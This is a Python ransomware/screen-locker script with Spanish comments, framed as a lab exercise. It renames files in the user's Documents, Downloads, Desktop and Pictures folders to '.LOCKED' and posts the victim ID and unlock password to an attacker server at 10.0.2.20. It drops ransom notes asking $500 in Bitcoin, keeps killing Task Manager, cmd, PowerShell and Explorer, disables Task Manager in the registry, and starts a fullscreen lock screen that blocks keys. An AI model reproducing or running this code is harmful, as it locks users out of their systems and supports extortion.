import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
from pathlib import Path

class RansomwareCompleto:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)', 'System32',
            'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        
        # ⚡⚡⚡ IP DE KALI LINUX - CAMBIA SI ES NECESARIO ⚡⚡⚡
        self.kali_ip = "10.0.2.20"  # IP de tu Kali Linux
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        try:
            if filepath.stat().st_size < 100:
                return False
        except:
            return False
            
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx']
        
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 30))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))

    def test_connection(self):
        """Testea la conexión con el servidor Kali"""
        print(f"🔗 Probando conexión con Kali Linux ({self.kali_ip})...")
        try:
            # Primero probar ping
            result = os.system(f"ping -n 1 {self.kali_ip} >nul 2>nul")
            if result == 0:
                print("✅ Kali Linux responde al ping")
            else:
                print("❌ Kali Linux NO responde al ping")
                return False
            
            # Probar el servidor web
            response = requests.get(f'http://{self.kali_ip}/victima.php', timeout=5)
            print(f"✅ Servidor web respondió: {response.status_code}")
            return True
            
        except requests.exceptions.ConnectionError:
            print(f"❌ No se puede conectar al servidor web en {self.kali_ip}")
            print("   Verifica:")
            print("   - Que Apache esté corriendo en Kali: sudo systemctl status apache2")
            print("   - Que el archivo victima.php esté en /var/www/html/")
            print("   - Que no haya firewall bloqueando")
            return False
        except Exception as e:
            print(f"❌ Error de conexión: {e}")
            return False

    def send_credentials(self):
        """Envía credenciales al servidor Kali y las guarda en la base de datos"""
        print(f"📤 Enviando credenciales a {self.url}...")
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=10)
            
            if response.text.strip() == 'Ok.':
                print("✅ Credenciales enviadas exitosamente a la base de datos")
                print(f"   📝 ID: {self.victim_id}")
                print(f"   🔐 Password: {self.password}")
                return True
            else:
                print(f"⚠️ Respuesta inesperada del servidor: {response.text}")
                self.save_credentials_local()
                return False
                
        except requests.exceptions.ConnectionError:
            print("❌ Error: No se pudo conectar al servidor Kali")
            print("   Las credenciales se guardarán localmente")
            self.save_credentials_local()
            return False
        except Exception as e:
            print(f"❌ Error enviando credenciales: {e}")
            self.save_credentials_local()
            return False

    def save_credentials_local(self):
        """Guarda credenciales localmente si falla el envío"""
        try:
            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
                f.write(f"ID: {self.victim_id}\n")
                f.write(f"PASSWORD: {self.password}\n")
                f.write(f"BITCOIN: {self.bitcoin}\n")
                f.write(f"PRICE: ${self.price}\n")
                f.write(f"KALI_IP: {self.kali_ip}\n")
            print("📄 Credenciales guardadas en CREDENCIALES_LOCALES.txt")
        except:
            pass

    def encrypt_file_windows(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
                
            new_name = str(filepath) + '.LOCKED'
            os.rename(filepath, new_name)
            self.encryption_count += 1
            return True
                
        except:
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
            return encrypted_files
        except:
            return 0

    def create_ransom_note(self):
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    !!! SISTEMA BLOQUEADO !!!                 ║
╚══════════════════════════════════════════════════════════════╝

🔐 TODOS SUS ARCHIVOS HAN SIDO CIFRADOS 🔐

INFORMACIÓN PARA LA RECUPERACIÓN:
• ID Único: {self.victim_id}
• Pago Requerido: ${self.price} en Bitcoin
• Dirección Bitcoin: {self.bitcoin}

⚠️  NO APAGUE LA COMPUTADORA ⚠️
⚠️  NO REINSTALE EL SISTEMA ⚠️

Para recuperar sus archivos, ingrese la clave de descifrado a continuación:
"""
        
        locations = [
            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
            'C:/INSTRUCCIONES.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print(f"📄 Nota de rescate creada en: {location}")
            except:
                pass

    def kill_system_tools(self):
        """Mata todas las herramientas del sistema"""
        tools = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
            'explorer.exe', 'msconfig.exe', 'compmgmt.msc', 'perfmon.exe',
            'eventvwr.exe', 'services.msc', 'control.exe', 'mmc.exe'
        ]
        
        for tool in tools:
            try:
                os.system(f'taskkill /f /im {tool} 2>nul')
            except:
                pass

    def disable_task_manager(self):
        """Deshabilita el administrador de tareas"""
        try:
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
        except:
            pass

    def create_black_screen(self):
        """Crea la pantalla negra de bloqueo completo"""
        black_screen_code = f'''
import tkinter as tk
import tkinter.messagebox as messagebox
import sys
import os
import subprocess
import threading
import time

class FullScreenBlocker:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_ui()
        self.start_monitoring()
        
    def setup_ui(self):
        # Pantalla completa
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.bind("<Key>", self.on_key_press)
        self.root.bind("<Button>", self.on_click)
        
        # Frame principal
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True, fill="both", padx=50, pady=50)
        
        # Título
        title = tk.Label(
            main_frame,
            text="🔐 SISTEMA COMPLETAMENTE BLOQUEADO",
            font=("Arial", 32, "bold"),
            fg="red",
            bg="black"
        )
        title.pack(pady=20)
        
        # Mensaje
        message = tk.Label(
            main_frame,
            text="FALTA REPARAR LA CONEXIÓN\\\\nTodos sus archivos han sido cifrados",
            font=("Arial", 20),
            fg="white",
            bg="black"
        )
        message.pack(pady=10)
        
        # ID de víctima
        victim_id = tk.Label(
            main_frame,
            text=f"ID: {self.victim_id}",
            font=("Arial", 16, "bold"),
            fg="yellow",
            bg="black"
        )
        victim_id.pack(pady=10)
        
        # Frame de entrada
        input_frame = tk.Frame(main_frame, bg="black")
        input_frame.pack(pady=30)
        
        tk.Label(
            input_frame,
            text="Ingrese la clave de descifrado:",
            font=("Arial", 14),
            fg="white",
            bg="black"
        ).pack()
        
        self.password_entry = tk.Entry(
            input_frame,
            font=("Arial", 16),
            width=40,
            show="*"
        )
        self.password_entry.pack(pady=10)
        self.password_entry.focus()
        
        # Botón de verificación
        verify_btn = tk.Button(
            input_frame,
            text="VERIFICAR CLAVE",
            font=("Arial", 14, "bold"),
            bg="red",
            fg="white",
            command=self.verify_password,
            width=20,
            height=2
        )
        verify_btn.pack(pady=10)
        
        # Contador
        self.counter = 0
        self.counter_label = tk.Label(
            main_frame,
            text="Tiempo bloqueado: 0 segundos",
            font=("Arial", 12),
            fg="gray",
            bg="black"
        )
        self.counter_label.pack(side="bottom", pady=10)
        
    def on_key_press(self, event):
        # Bloquear teclas del sistema
        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12", "Super_L", "Super_R"]:
            return "break"
            
    def on_click(self, event):
        return "break"
        
    def verify_password(self):
        password = self.password_entry.get()
        if password == "{self.password}":
            self.unlock_system()
        else:
            messagebox.showerror("Error", "Clave incorrecta. Sistema permanece bloqueado.")
            self.password_entry.delete(0, tk.END)
            
    def unlock_system(self):
        # Restaurar sistema
        try:
            subprocess.Popen(["python", "DECRYPT_FILES.py"])
        except:
            pass
        self.root.destroy()
        sys.exit()
        
    def update_counter(self):
        self.counter += 1
        self.counter_label.config(text=f"Tiempo bloqueado: {{self.counter}} segundos")
        self.root.after(1000, self.update_counter)
        
    def start_monitoring(self):
        # Monitorear y cerrar ventanas emergentes
        def monitor():
            while True:
                try:
                    # Cerrar administrador de tareas si se abre
                    os.system("taskkill /f /im taskmgr.exe 2>nul")
                    os.system("taskkill /f /im cmd.exe 2>nul")
                    os.system("taskkill /f /im powershell.exe 2>nul")
                    time.sleep(1)
                except:
                    pass
                    
        thread = threading.Thread(target=monitor)
        thread.daemon = True
        thread.start()
        
        self.update_counter()
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    blocker = FullScreenBlocker()
    blocker.run()
'''
        
        try:
            with open('black_screen.py', 'w', encoding='utf-8') as f:
                f.write(black_screen_code)
        except:
            pass

    def start_black_screen(self):
        """Inicia la pantalla negra"""
        try:
            subprocess.Popen([sys.executable, 'black_screen.py'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    def create_decryptor(self):
        decrypt_script = f'''import os
import shutil

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def main():
    print("Sistema de Recuperación de Archivos")
    print("===================================")
    print(f"ID de víctima: {{VICTIM_ID}}")
    
    input_password = input("Ingrese la clave de descifrado: ")
    
    if input_password != PASSWORD:
        print("Clave incorrecta. Sistema permanece bloqueado.")
        input("Presione Enter para salir...")
        return
        
    print("Clave verificada. Descifrando archivos...")
    
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            original_file = enc_file[:-7]  # Remover .LOCKED
            os.rename(enc_file, original_file)
            success_count += 1
            print(f"✓ Recuperado: {{os.path.basename(original_file)}}")
        except Exception as e:
            print(f"✗ Error con {{os.path.basename(enc_file)}}: {{e}}")
            
    print(f"\\\\nProceso completado!")
    print(f"Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
    
    # Eliminar archivos temporales
    try:
        if os.path.exists("black_screen.py"):
            os.remove("black_screen.py")
        if os.path.exists("LEAME_URGENTE.txt"):
            os.remove("LEAME_URGENTE.txt")
        if os.path.exists("INSTRUCCIONES.txt"):
            os.remove("INSTRUCCIONES.txt")
    except:
        pass
        
    print("\\\\n¡Sistema completamente recuperado!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
        
        try:
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
        except:
            pass

    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        print("🔐 INICIANDO BLOQUEO COMPLETO DEL SISTEMA")
        print("=" * 50)
        
        # Paso 1: Configurar conexión
        print("\\\\n[1/5] 🔗 Configurando conexión con Kali Linux...")
        if not self.test_connection():
            print("¿Continuar sin conexión? (s/n)")
            if input().lower() != 's':
                print("Ejecución cancelada.")
                return
        
        # Paso 2: Generar claves
        print("\\\\n[2/5] 🔑 Generando claves de cifrado...")
        self.generate_keys()
        
        # Paso 3: Enviar credenciales
        print("\\\\n[3/5] 📤 Enviando credenciales a la base de datos...")
        self.send_credentials()
        
        # Paso 4: Cifrar archivos
        print("\\\\n[4/5] 📁 Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(f"   📂 {{directory}}: {{encrypted}} archivos")
        
        # Paso 5: Bloquear sistema
        print("\\\\n[5/5] 🚫 Activando bloqueo completo...")
        self.create_ransom_note()
        self.create_decryptor()
        self.create_black_screen()
        
        self.kill_system_tools()
        self.disable_task_manager()
        self.start_black_screen()
        
        print("✅ SISTEMA BLOQUEADO EXITOSAMENTE")
        print(f"📊 Total archivos cifrados: {{total_encrypted}}")
        print(f"🔑 Clave de recuperación: {{self.password}}")
        print("🖥️ Pantalla negra activada - Sistema completamente bloqueado")
        
        # Bloqueo continuo
        while True:
            self.kill_system_tools()
            time.sleep(2)

if __name__ == "__main__":
    print("⚠️  BLOQUEO COMPLETO DEL SISTEMA - LABORATORIO")
    print("SOLO PARA ENTORNOS CONTROLADOS")
    print("=" * 50)
    
    confirm = input("¿Continuar? (escribe 'BLOQUEAR'): ")
    if confirm != "BLOQUEAR":
        print("Ejecución cancelada.")
        sys.exit()
        
    ransomware = RansomwareCompleto()
    
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("\\\\n❌ Ejecución interrumpida por el usuario")
    except Exception as e:
        print(f"\\\\n❌ Error durante la ejecución: {{e}}")
